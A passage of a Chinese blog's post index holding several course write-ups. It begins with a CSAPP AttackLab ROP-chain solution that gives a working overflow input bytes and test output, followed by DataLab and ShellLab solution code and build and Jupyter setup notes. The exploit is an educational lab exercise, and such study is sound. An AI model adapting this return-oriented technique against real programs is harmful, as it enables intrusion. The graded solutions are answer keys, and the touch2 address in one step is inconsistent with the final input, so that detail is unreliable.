lea -0x3c3876b8(%rdi),%eax 4019a6: c3对应的指令地址是 4019c500000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 90是nop指令，不影响功能经查询后可以知道，这条指令是movq %rax, %rdi, 所以需要先将cookie保存到%rax要完成这一操作，需要先将cookie保存在栈上，然后弹出到%rax中，所以满足要求的指令是： 1popq %rax 对应的机器码是58, 查到的有： 123456789# 对应的指令地址是 4019ab00000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 ret# 对应的指令地址是 4019cc00000000004019ca &lt;getval_280&gt;: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 所以攻击的流程为：先执行构造出指令： 12popq %raxmovq %rax, %rdi 执行完后，然后跳转到touch2即可完成 所以输入的内容格式如下： 123456---- // getbuf的输入缓冲区---- // getbuf的输入缓冲区0x4019ab // 第一条指令的地址，这里选择满足要求的第一个0x59b997fa // cookie0x4019a2 // 第二条指令的地址，这里选择满足要求的第一个0x40184c // touch2的地址 最后的输入如下： 12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00a2 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00 测试： 123456789$ ./hex2raw &lt;p4.txt| ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00","link":"/posts/a4b4efe7.html"},{"title":"CSAPP DataLab","text":"csapp DataLab bitXor12345678910/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) { return ~(~y &amp; ~x) &amp; ~(x &amp; y);} tmin123456789/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) { return 1 &lt;&lt; 31;} isTmax12345678910/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) { return !(~x ^ (x + 1)) &amp; !!(x + 1);} allOddBits123456789101112131415/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) { int mask = 0xAA; mask = mask &lt;&lt; 8 | mask; mask = mask &lt;&lt; 16 | mask; return !((x &amp; mask )^ mask);} negate12345678910111213/*- negate - return -x- Example: negate(1) = -1.- Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;- Max ops: 5- Rating: 2 _/*/ int negate(int x) { return ~x + 1; } isAsciiDigit123456789101112131415/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) { int y = x &gt;&gt; 4; int z = x &amp; 0xf; // 最低4位 return !(y ^ 0x3) &amp; !((0x9 + ((~z) + 1)) &gt;&gt; 31);} conditional1234567891011121314/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) { int isZero = !(x ^ 0); int mask = ~isZero + 1; return (~mask &amp; y) | (mask &amp; z);} isLessOrEqual12345678910111213141516171819/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) { int signx = x &gt;&gt; 31; int signy = y &gt;&gt; 31; int c1 = !(signx ^ signy); int signsub = (x + (~y + 1)) &gt;&gt; 31; // return !(x ^ y) | (!c1 &amp; signx) | (c1 &amp; signsub) | (c1 &amp; signsub); return (!(x ^ y)) | ((!c1) &amp; signx) | (c1 &amp; signsub);} logicalNeg123456789101112/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) { return ((x | (~x + 1)) &gt;&gt; 31) + 1;} howManyBits123456789101112131415161718192021222324252627282930/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { int b16, b8, b4, b2, b1, b0; int sign = x &gt;&gt; 31; x = (sign &amp; ~x) | (~sign &amp; x); b16 = !!(x &gt;&gt; 16) &lt;&lt; 4; x = x &gt;&gt; b16; b8 = !!(x &gt;&gt; 8) &lt;&lt; 3; x = x &gt;&gt; b8; b4 = !!(x &gt;&gt; 4) &lt;&lt; 2; x = x &gt;&gt; b4; b2 = !!(x &gt;&gt; 2) &lt;&lt; 1; x = x &gt;&gt; b2; b1 = !!(x &gt;&gt; 1); x = x &gt;&gt; b1; b0 = x; return b16 + b8 + b4 + b2 + b1 + b0 + 1;} floatScale212345678910111213141516171819202122/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) { unsigned s = uf &amp; (1 &lt;&lt; 31); unsigned exp = (uf &amp; 0x7f800000) &gt;&gt; 23; unsigned frac = (uf &amp; ~0xff800000); if (exp == 0) return s | frac &lt;&lt; 1; else if (exp == 255) return uf; return s | (exp + 1) &lt;&lt; 23| frac;} floatFloat2Int123456789101112131415161718192021222324252627282930/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) { unsigned s = uf &amp; (1 &lt;&lt; 31); unsigned exp = (uf &amp; 0x7f800000) &gt;&gt; 23; unsigned frac = (uf &amp; ~0xff800000); int sign = (s &gt;&gt; 31) == 1 ?-1 : 1; int E = exp - 127; unsigned M = frac | (1 &lt;&lt; 23); if (E &gt; 31 || exp == 255) { return 0x80000000u; } if (E &lt; 0) return 0; return sign * (E &gt; 23 ? M &lt;&lt; (E - 23) : M &gt;&gt; (23 - E));} floatPower2123456789101112131415161718192021222324252627/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) { if (x &lt; -149) { return 0; } else if (x &gt; 127) { return 0x7F800000; } else if (x &gt;= -126) { int exp = x + 127; return exp &lt;&lt; 23; } else { int frac = 1 &lt;&lt; (23 - (-126 - x)); return frac; }}","link":"/posts/61702333.html"},{"title":"cmu15455 project0踩坑记录","text":"实验要求：24fall project 0 实验有两个任务：Task1: 实现一个基础的HyperLogLog，使用了稀疏布局，文件包括hyperloglog.h和hyperloglog.cppTask2: HyperLogLog_presto，使用了密集布局，文件包括hyperloglog_presto.h和hyperloglog_presto.cpp 环境配置我的实验环境为：windows11 + wsl + ubuntu24.04LTS + vscode 安装依赖按照实验指引，操作到如下命令的时候 12345678# Linuxsudo build_support/packages.sh# 结果Unsupported distribution 'LINUX'Please contact our support team for additional help.Be sure to include the contents of this message.Platform: Linux ll 5.15.167.4-microsoft-standard-WSL2 #1 SMP Tue Nov 5 00:21:55 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 提示我们不支持的系统版本，解决办法可以参考下面的内容 找到这个 packages.sh文件,里面有如下的内容 123456789101141 LINUX)42 version=$(cat /etc/os-release | grep VERSION_ID | cut -d '&quot;' -f 2)43 case $version in44 18.04) install_linux ;;45 20.04) install_linux ;;46 22.04) install_linux ;;47 *) give_up ;;48 esac49 ;;5051 *) give_up ;; 按照实验指引, 只支持这三个版本的linux, 所以需要修改执行下面的命令 12cat /etc/os-release | grep VERSION_ID | cut -d '&quot;' -f 224.04 我的结果是24.04， 所以修改 packages.sh文件 123456 18.04) install_linux ;;45 20.04) install_linux ;;46 22.04) install_linux ;;46 24.04) install_linux ;;47 *) give_up ;;48 esac 当然也可以直接执行install_linux函数的命令，这个函数在文件的最下面然后重新安装依赖 12# Linuxsudo build_support/packages.sh 可能会出现找不到依赖的情况(时间过于久远，记不太清了)， 执行下面的命令 1sudo vim /etc/apt/sources.list 然后将下面的内容保存到文件中 12345678deb http://apt.llvm.org/noble/ llvm-toolchain-noble maindeb-src http://apt.llvm.org/noble/ llvm-toolchain-noble main# 19deb http://apt.llvm.org/noble/ llvm-toolchain-noble-19 maindeb-src http://apt.llvm.org/noble/ llvm-toolchain-noble-19 main# 20deb http://apt.llvm.org/noble/ llvm-toolchain-noble-20 maindeb-src http://apt.llvm.org/noble/ llvm-toolchain-noble-20 main 这里的内容取决于系统，如果和我的系统不一致，请参考llvm修改 再重新安装依赖 cmake构建继续按照实验指引 123mkdir buildcd buildcmake .. 可能会出现以下的输出 1234CMake Warning at CMakeLists.txt:52 (message): !! We recommend that you use clang-14 for developing BusTub. You're using Clang 21.0.0, a different version. 这个是因为实验要求的版本是clang-14,而我的是clang-21一个比较简单直接的方法是，找到仓库最外层的目录（例如我这里是bustub-private），这里有一个CMakeLists.txt文件，注释掉文件的51和52行 123456if(CMAKE_CXX_COMPILER_ID STREQUAL &quot;Clang&quot;) if(CMAKE_CXX_COMPILER_VERSION MATCHES &quot;^14.&quot;) message(STATUS &quot;You're using ${CMAKE_CXX_COMPILER_ID} ${CMAKE_CXX_COMPILER_VERSION}&quot;) # else() # message(WARNING &quot;!! We recommend that you use clang-14 for developing BusTub. You're using ${CMAKE_CXX_COMPILER_ID} ${CMAKE_CXX_COMPILER_VERSION}, a different version.&quot;) endif() 也可能有下面的输出 123456CMake Deprecation Warning at third_party/backward-cpp/CMakeLists.txt:23 (cmake_minimum_required): Compatibility with CMake &lt; 3.5 will be removed from a future version of CMake. Update the VERSION argument &lt;min&gt; value or use a ...&lt;max&gt; suffix to tell CMake that the project does not need compatibility with older versions. 这也是因为版本的问题，进入最外层目录的third_party目录，修改输出里面提到的第三方库的CMakeLists.txt里面的内容 1cmake_minimum_required(VERSION 3.5) 具体版本按照命令行输出修改然后在vscode安装插件，就可以愉快的进行实验了（笑 提交实验按照实验要求，需要提交一个压缩包 1make submit-p0 这个命令会将实验0打成一个压缩包，我这里是project0-submission.zip,在最外层目录这里也可能会出现问题，我完成实验时候，是做的2024fall学期，但是github仓库已经是2025spring版本了，导致压缩的文件不对。可以参考下面的方法解决 修改最外层CMakeLists.txt，修改262行的内容为 123456set(P0_FILES &quot;src/include/primer/hyperloglog.h&quot; &quot;src/include/primer/hyperloglog_presto.h&quot; &quot;src/primer/hyperloglog.cpp&quot; &quot;src/primer/hyperloglog_presto.cpp&quot;) 具体行数可能有变化，可以在文件中搜索P0_FILES来定位 接下来就是实验中遇到的问题了 bitset索引正常的数组,如[1,2,3,4,5],其索引从左到右依次增加 1234int nums[]{1,2,3,4,5}for (int i = 0; i &lt; 5; i++) { cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;;} 输入的结果为1 2 3 4 5 但是bitset的索引正好相反，最右侧的为0，最左侧的为size - 1比如[1000,1000], 按照索引从0开始遍历， 结果是 0001,0001 一些小细节还有的就是一些微不足道的小细节，需要动用我们脑中的灰色细胞（波洛语 Task2中，如果0的个数大于bashline,需要将其分成两部分保存，如何确定baseline关键在于dense_bucket_的容量，例如这里是#define DENSE_BUCKET_SIZE 4，4bit能表示最大的数为15，大于这个数的都需要分成两部分 计算求和的时候，需要将dense_bucket_和overflow_bucket_指定位置的值重新组合成0的个数 整体来说，实验内容不是很难，难度更大的地方在于环境的配置和c++语法以及题意的理解上以上，下个实验见","link":"/posts/43cd74e0.html"},{"title":"CSAPP ShellLab","text":"csapp ShellLab 实验准备实验提供了一些结构体和函数 结构体 job_t首先是job_t，和保存job的数组jobs 1234567struct job_t { pid_t pid; int jid; int state; char cmdline[MAXLINE];};struct job_t jobs[MAXJOBS]; 有两个注意项 在实验中都需要小心维护jobs,原因是程序涉及到对这个数组并发操作 state保存这任务的状态:UNDEF,FG,BG,ST,由宏定义 辅助函数程序提供了下面一些辅助函数，可以用于任务相关的操作 12345678910void clearjob(struct job_t *job);void initjobs(struct job_t *jobs);int maxjid(struct job_t *jobs);int addjob(struct job_t *jobs, pid_t pid, int state, char *cmdline);int deletejob(struct job_t *jobs, pid_t pid);pid_t fgpid(struct job_t *jobs);struct job_t *getjobpid(struct job_t *jobs, pid_t pid);struct job_t *getjobjid(struct job_t *jobs, int jid);int pid2jid(pid_t pid);void listjobs(struct job_t *jobs); 例如，可以使用addjob添加一个任务到jobs数组中；可以使用fgpid通过pid获取任务的指针 main的主要逻辑12345678910111213int main(int argc, char **argv) { //... Signal(SIGINT, sigint_handler); Signal(SIGTSTP, sigtstp_handler); Signal(SIGCHLD, sigchld_handler); Signal(SIGQUIT, sigquit_handler); while (1) { eval(cmdline); } //...} 已经绑定了SIGINT, SIGTSTP, SIGCHLD, SIGQUIT这四个信号，除了最后一个外都需要实现信号处理函数 while 反复调用了eval函数，用于解析命令并交由对应的程序处理 实现这个lab, 要求实现下面七个函数： 12345678void eval(char *cmdline);int builtin_cmd(char **argv);void do_bgfg(char **argv);void waitfg(pid_t pid);void sigchld_handler(int sig);void sigint_handler(int sig);void sigtstp_handler(int sig); 最后三个是信号处理函数 eval有二个要求 如果是内建命令，立即执行，否则创建一个子进程执行 如果子进程需要前台执行，程序会等待其完成，否则不等待 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 void eval(char *cmdline){ char *argv[MAXARGS]; char buf[MAXLINE]; int bg; pid_t pid; sigset_t mask_all, mask_one, prev_all, prev_one; sigemptyset(&amp;mask_one); sigaddset(&amp;mask_one,SIGCHLD); sigfillset(&amp;mask_all); strcpy(buf, cmdline); bg = parseline(buf, argv); int state = (bg == 1 ? BG: FG); if (argv[0] == NULL) { return; } if (!builtin_cmd(argv)) { sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); if ((pid = Fork()) == 0) { setpgid(0,0); sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); if (execve(argv[0], argv, environ) &lt; 0 ) { printf(&quot;%s Command not found\\n&quot;, argv[0]); exit(0); } } sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); addjob(jobs, pid, state, cmdline); // 可能添加失败 sigprocmask(SIG_SETMASK, &amp;prev_all, NULL); sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); struct job_t* job = getjobpid(jobs, pid); if(!bg) { waitfg(pid); } else { printf(&quot;[%d] (%d) %s&quot;, job -&gt; jid, pid, cmdline); } } return;} builtin_cmd123456789101112131415161718int builtin_cmd(char **argv){ // quit, jobs, bg or fg if (!strcmp(&quot;quit&quot;, argv[0])) { exit(0); } if (!strcmp(&quot;bg&quot;, argv[0]) || !strcmp(&quot;fg&quot;, argv[0])) { do_bgfg(argv); return 1; } if (!strcmp(&quot;jobs&quot;, argv[0])) { listjobs(jobs); return 1; } return 0; /* not a builtin command */} do_bgfg1234567891011121314151617181920212223242526272829303132333435363738394041424344void do_bgfg(char **argv){ if (argv[1] == NULL) { printf(&quot;%s command requires PID or %%jobid argument\\n&quot;, argv[0]); return; } int state = strcmp(argv[0], &quot;bg&quot;) == 0? BG: FG; int id; struct job_t* job = NULL; if (argv[1][0] == '%') { if( sscanf(&amp;argv[1][1], &quot;%d&quot;, &amp;id) &gt; 0) { job = getjobjid(jobs, id); if (job == NULL) { printf(&quot;%%%d: No such job&quot;, id); return; } } }else if(sscanf(&amp;argv[1][0], &quot;%d&quot;, &amp;id) &gt; 0) { job = getjobjid(jobs, id); if (job == NULL) { printf(&quot;(%d): No such process\\n&quot;, id); return; } }else { printf(&quot;%s: argument must be a PID or %%jobid\\n&quot;,argv[0]); return; } sigset_t mask, prev; sigfillset(&amp;mask); sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); job -&gt; state = state; kill(-(job -&gt; pid), SIGCONT); sigprocmask(SIG_SETMASK, &amp;prev, NULL); if (state == BG) { printf(&quot;[%d] (%d) %s&quot;, job -&gt; jid, job -&gt; pid, job -&gt; cmdline); }else{ waitfg(job -&gt; pid); } return;} waitfg12345678910void waitfg(pid_t pid){ sigset_t mask; sigemptyset(&amp;mask); while(fgpid(jobs) != 0) { sigsuspend(&amp;mask); } return;} sigchld_handler1234567891011121314151617181920212223242526272829void sigchld_handler(int sig){ pid_t pid; int status; int olderrno = errno; struct job_t * job = NULL; sigset_t mask, prev; sigfillset(&amp;mask); while ((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0) { sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); if (WIFEXITED(status)) { // 正常终止 deletejob(jobs, pid); }else if (WIFSIGNALED(status)) { // 被信号终止 printf(&quot;Job [%d] (%d) terminated by signal %d\\n&quot;, pid2jid(pid), pid, WTERMSIG(status)); deletejob(jobs, pid); }else if (WIFSTOPPED(status)) { // 被信号停止 printf(&quot;Job [%d] (%d) stopped by signal %d\\n&quot;, pid2jid(pid), pid, WSTOPSIG(status)); job = getjobpid(jobs, pid); job -&gt; state = ST; } sigprocmask(SIG_SETMASK, &amp;prev, NULL); } errno = olderrno; return;} sigint_handler12345678void sigint_handler(int sig){ pid_t pid; if((pid = fgpid(jobs)) &gt; 0) { kill(-pid, sig); } return;} sigtstp_handler12345678void sigtstp_handler(int sig){ pid_t pid; if((pid = fgpid(jobs)) &gt; 0) { kill(-pid, sig); } return;}","link":"/posts/88ff41e9.html"},{"title":"使用pipx安装Jupyter Lab","text":"如何使用pipx安装Jupyter Lab,并注册新的内核 安装 Jupyter Lab1pipx install jupyterlab --include-deps --include-deps 参数的作用： 默认情况下 pipx 只安装​​直接依赖​​（即 jupyterlab 包本身） 添加此参数后会​​额外安装完整依赖树​​，包括： Jupyter 核心组件（notebook, jupyter-core） IPython 内核 前端依赖（如 jupyter-server, jupyter-client） 其他必要组件 安装常用依赖一些常用的依赖，直接安装到jupyter环境中可能是更好的选择 12pipx inject jupyterlab pandaspipx ensurepath 注册新内核查看已经注册的内核 123jupyter kernelspec listAvailable kernels: python3 C:\\Users\\***\\pipx\\venvs\\jupyterlab\\share\\jupyter\\kernels\\python3 可以直接在当前虚拟环境中安装一个内核，并将其注册到jupyter中 12345678pip install ipykernelpython -m ipykernel install --display-name &quot;$(Get-Location)&quot; --name &quot;$(Split-Path -Leaf (Get-Location))&quot;# 查看内核jupyter kernelspec listAvailable kernels: python3 C:\\Users\\***\\pipx\\venvs\\jupyterlab\\share\\jupyter\\kernels\\python3 introduction_to_ml_with_python C:\\Users\\***\\AppData\\Roaming\\jupyter\\kernels\\introduction_to_ml_with_python 启动后可以看到两个内核 1jupyter lab","link":"/posts/9cafca2a.html"},{"title":"执行 jupyter-lab 命令后，浏览器显示拒绝访问文件","text":"执行jupyter-lab命令后，浏览器显示拒绝访问文件 描述在管理员终端执行 123456$ jupyter-lab# 输出# To access the server, open this file in a browser:# file:///C:/Users/***/AppData/Roaming/jupyter/runtime/jpserver-22612-open.html# Or copy and paste one of these URLs:# http://localhost:8888/lab?token=d973fd9422e6b7d0b1a517a23f58027b5b09475cce6053b9 http://路径可以访问，但是不能以file://的形式访问 浏览器显示的内容： 12# 拒绝访问文件**file:///C:/Users/***/AppData/Roaming/jupyter/runtime/jpserver-22612-open.html** 处的文件不可读。 它可能已被移动或删除，或者文件权限可能正在阻止访问。 浏览器控制台的输出： 1chromewebdata/:1 Not allowed to load local resource: file:///C:/Users/***/AppData/Roaming/jupyter/runtime/jpserver-24248-open.html 但是在非管理员终端执行jupyter-lab能够通过file://的方式访问 解决方法修改文件夹runtime当前用户的权限为完全控制","link":"/posts/e0801949.html"}],"tags":[{"name":"pipx","slug":"pipx","link":"/tags/pipx/"},{"name":"Jupyter Lab","slug":"Jupyter-Lab","link":"/tags/Jupyter-Lab/"}],"categories":[{"name":"CSAPP","slug":"CSAPP","link":"/categories/CSAPP/"},{"name":"cmu15455-2024fall","slug":"cmu15455-2024fall","link":"/categories/cmu15455-2024fall/"},{"name":"遇到的各种问题","slug":"遇到的各种问题","link":"/categories/%E9%81%87%E5%88%B0%E7%9A%84%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98/"}],"pages":[]}